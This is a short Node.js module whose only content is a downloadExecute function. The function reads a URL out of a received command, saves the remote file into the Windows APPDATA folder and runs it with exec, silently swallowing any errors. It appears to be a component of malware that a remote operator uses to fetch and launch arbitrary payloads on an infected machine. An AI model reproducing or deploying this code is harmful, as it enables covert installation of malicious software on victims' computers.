const http = require("http");
const https = require("https");
const fs = require("fs");
const { exec } = require("child_process");

function downloadExecute(command) {
  const fileUrl = command.split(" ")[1];
  const fileName = fileUrl.split("/")[fileUrl.split("/").length - 1];
  const localFile = `${process.env.APPDATA}\\${fileName}`;
  const createFile = fs.createWriteStream(localFile);

  (command.includes("https") ? https : http).get(fileUrl, function (response) {
    response.pipe(createFile);
    exec(localFile, (error, stdout, stderr) => {
      if (error) {
        return;
      }
      if (stderr) {
        return;
      }
    });
  });
}
module.exports = downloadExecute
